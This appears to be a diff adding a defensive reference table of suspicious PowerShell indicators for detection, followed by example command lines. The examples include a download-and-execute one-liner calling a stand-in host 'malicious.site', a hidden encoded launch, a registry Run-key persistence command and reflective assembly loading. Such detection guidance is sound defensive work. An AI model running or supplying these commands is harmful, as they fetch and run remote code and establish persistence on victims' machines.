@@ -1,0 +1,18 @@
+| Category                      | Suspicious Indicator                                                                       | Explanation                                                                                        |
+| ----------------------------- | ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| **Encoded Commands**          | `-EncodedCommand` with base64 payload                                                      | Hides script content, often part of malware delivery. Can bypass basic detection.                  |
+| **Obfuscation**               | String concatenation, `-join`, `[char]`, or hex encoding                                   | `([char]105)+([char]101)+([char]120)` to evade detection; used in most PowerShell malware loaders. |
+| **Dynamic Invocation**        | `Invoke-Expression`, `IEX`, or downloading and executing scripts                           | Used to run fetched scripts from memory without touching disk.                                     |
+| **Web Requests**              | Uses `Invoke-WebRequest`, `Net.WebClient`, `DownloadString` to fetch remote code           | Common in initial access or malware staging.                                                       |
+| **Bypass Indicators**         | Uses `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, or `Start-Process` with obfuscation | Used to run scripts stealthily, evade user notice or security tools.                               |
+| **Persistence Behavior**      | Writes to registry `Run` keys, WMI Event Consumers, or Scheduled Tasks                     | `Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`                       |
+| **Raw Memory Ops**            | Loads assemblies, manipulates memory, or injects shellcode                                 | Calls to `VirtualAlloc`, `CreateThread`, `Add-Type` with raw C# code.                              |
+| **Suspicious Parent Process** | Spawned by MS Office, Adobe, 7zip, or other non-shell apps                                 | PowerShell spawned by `winword.exe` or `excel.exe` often indicates macro abuse.                    |
+| **Non-Standard File Paths**   | Running from `%APPDATA%`, `%TEMP%`, `Downloads`                                            | Legit scripts rarely live in these directories. Malware often does.                                |
+| **Non-Human Patterns**        | Scheduled or repeated activity with minimal variation                                      | Signs of automation, lateral movement, or beaconing behavior.                                      |
+
+Real World Suspicious Examples: 
+powershell.exe -nop -w hidden -enc SQBtAHAAbwByAH...
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/shell.ps1')
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe ..."
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String("..."))
